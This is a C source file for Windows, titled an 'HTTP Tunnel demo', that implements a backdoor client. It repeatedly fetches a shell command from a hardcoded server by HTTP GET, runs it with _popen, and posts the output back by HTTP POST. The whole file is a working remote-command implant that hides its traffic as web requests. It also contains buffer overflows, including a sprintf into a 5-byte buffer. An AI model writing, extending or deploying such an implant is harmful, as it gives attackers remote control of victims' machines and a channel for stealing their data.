/**
 * Description: HTTP Tunnel demo, this is execute command.
 * Author: xx
 * Version: 1.0
 * Time: 2017.4.11
 */

#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")

#define BUFSIZE 2048

const char server[] = "10.211.55.5";
const int port = 80;
const char getCommandBuf[] = "";
const char executeResultBuf[] = "";

int establishConn(SOCKET* sServer, SOCKADDR_IN* servAddr);
int sendBuf(SOCKET sServer, const char* buffer);
int receiveBuf(SOCKET sServer, char* command);
int exeCommandFunction(char* cmd, char* result);
int urlEncode(char* result);

int main(int argc, char* argv[]) {
	WSADATA wsaData;
	
	SOCKET sServer;
	SOCKADDR_IN servAddr;

	char buffer[BUFSIZE] = {0};
	char command[BUFSIZE] = {0};
	char result[BUFSIZE] = {0};
	int retVal = 0;

	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup Failed\n");
		return -1;
	}

	while(true) {
		//get command
		retVal = establishConn(&sServer, &servAddr);
		if(retVal != 0) {
			//error
			WSACleanup();
			return -1;
		}

		ZeroMemory(buffer, BUFSIZE);
		ZeroMemory(command, BUFSIZE);
		strcat(buffer, "GET /index.html HTTP/1.0\r\n");
		strcat(buffer, "Host: ");
		strcat(buffer, server);
		strcat(buffer, "\r\n");
		strcat(buffer, "Connection: close\r\n\r\n");

		retVal = sendBuf(sServer, buffer);
		if(retVal != 0) {
			closesocket(sServer);
			continue;
		}
		retVal = receiveBuf(sServer, command);
		if(retVal != 0) {
			closesocket(sServer);
			continue;
		}
		printf("Execute: %s\n", command);

		closesocket(sServer);

		//send result
		ZeroMemory(result, BUFSIZE);
		exeCommandFunction(command, result);

		retVal = establishConn(&sServer, &servAddr);
		if(retVal != 0) {
			//error
			WSACleanup();
			return -1;
		}

		//urlencode
		urlEncode(result);

		ZeroMemory(buffer, BUFSIZE);
		//GET
		/*
		strcat(buffer, "GET /index.php?result=");
		strcat(buffer, result);
		strcat(buffer, " HTTP/1.0\r\n");
		strcat(buffer, "Host: ");
		strcat(buffer, server);
		strcat(buffer, "\r\n");
		strcat(buffer, "Connection: close\r\n\r\n");
		*/

		//POST
		char length[5] = {0};
		sprintf(length, "%s%d", "Content-Length: ", strlen(result) + 7);	// +7 is strlen('result=')

		strcat(buffer, "POST /index.php HTTP/1.0\r\n");
		strcat(buffer, "Host: ");
		strcat(buffer, server);
		strcat(buffer, "\r\n");
		strcat(buffer, "Content-Type: application/x-www-form-urlencoded\r\n");
		strcat(buffer, length);
		strcat(buffer, "\r\n");
		strcat(buffer, "Connection: close\r\n\r\n");
		strcat(buffer, "result=");
		strcat(buffer, result);

		retVal = sendBuf(sServer, buffer);
		if(retVal != 0) {
			//printf("%d", GetLastError());
			closesocket(sServer);
			break;
		}

		//for debug
		getchar();

		closesocket(sServer);
		Sleep(5000);
	}

	WSACleanup();
	return 0;
}

int establishConn(SOCKET* sServer, SOCKADDR_IN* servAddr) {
	int retVal = 0;
	
	*sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(*sServer == INVALID_SOCKET) {
		printf("socket Failed\n");
		return -1;
	}

	//set address of server
	(*servAddr).sin_family = AF_INET;
	(*servAddr).sin_addr.S_un.S_addr = inet_addr(server);
	(*servAddr).sin_port = htons(port);

	//connect
	retVal = connect(*sServer, (LPSOCKADDR)servAddr, sizeof(*servAddr));
	if(retVal == SOCKET_ERROR) {
		printf("connect Failed\n");
		closesocket(*sServer);
		return -2;
	}

	//printf("Connected...\n");
	return 0;
}

int sendBuf(SOCKET sServer, const char* buffer) {
	int retVal = 0;

	//printf("%s\n", buffer);
	retVal = send(sServer, buffer, strlen(buffer), 0);
	if(retVal == -1) {
		printf("send Failed\n");
		return -1;
	}
	return 0;
}

int receiveBuf(SOCKET sServer, char* command) {
	int retVal = 0;
	char recvBuf[BUFSIZE] = {0};
	int i = 0;
	int j = 0;

	retVal = recv(sServer, recvBuf, BUFSIZE, 0);
	if(retVal == -1) {
		printf("recv Failed\n");
		return -1;
	}

	int length = strlen(recvBuf);
	while(i < length) {
		if(recvBuf[i] == '\r' && recvBuf[i+1] == '\n' && recvBuf[i+2] == '\r' && recvBuf[i+3] == '\n') {
			break;	//recvBuf[i+4] = command
		}
		i += 1;
	}
	
	i = i + 4;
	while(i < length) {
		command[j] = recvBuf[i];
		i += 1;
		j += 1;
	}
	command[j] = '\0';

	return 0;
}

int exeCommandFunction(char* cmd, char* result) {
	char buf[BUFSIZE];                                     //定义缓冲区                                   
    FILE* pipe = _popen(cmd, "r");                  //打开管道，并执行命令 
    if (!pipe)
        return -1;                                 //返回-1表示运行失败 
            
    while(!feof(pipe)) {
		if(fgets(buf, BUFSIZE, pipe)){                   //将管道输出到result中 
			strcat(result,buf);
        }
    }
    _pclose(pipe);                                          //关闭管道 

	return 0;
}

int urlEncode(char* result) {
	int i = 0;
	int length = strlen(result);
	
	while(i < length) {
		if(result[i] == ' ') {
			result[i] = '+';
		}

		i += 1;
	}

	return 0;
}
